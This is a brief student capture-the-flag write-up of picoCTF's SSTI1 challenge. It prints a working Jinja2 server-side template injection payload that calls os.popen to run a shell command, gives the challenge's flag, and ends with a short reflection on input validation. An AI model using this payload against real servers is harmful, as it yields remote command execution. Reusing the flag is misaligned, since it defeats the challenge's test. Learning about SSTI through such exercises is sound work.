# Module-Web Exploiatation
## Challenge 1-SSTI1
## What I did
```
I looked up pyjail ssti1. Thereafter, I came upon {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}. I pasted this on the website, which gave me the flag.
```
## Flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
## What I learned
In the SSTI1 challenge, I learned how Server-Side Template Injection (SSTI) vulnerabilities work and how they can be exploited when user input is unsafely embedded into server-side templates. By experimenting with different payloads, I discovered how template engines like Jinja2 can unintentionally execute code if input isnâ€™t properly sanitized. This taught me the importance of input validation and using safe rendering methods. Overall, the challenge helped me understand how even simple-looking web forms can expose serious security flaws if user input directly interacts with backend logic.
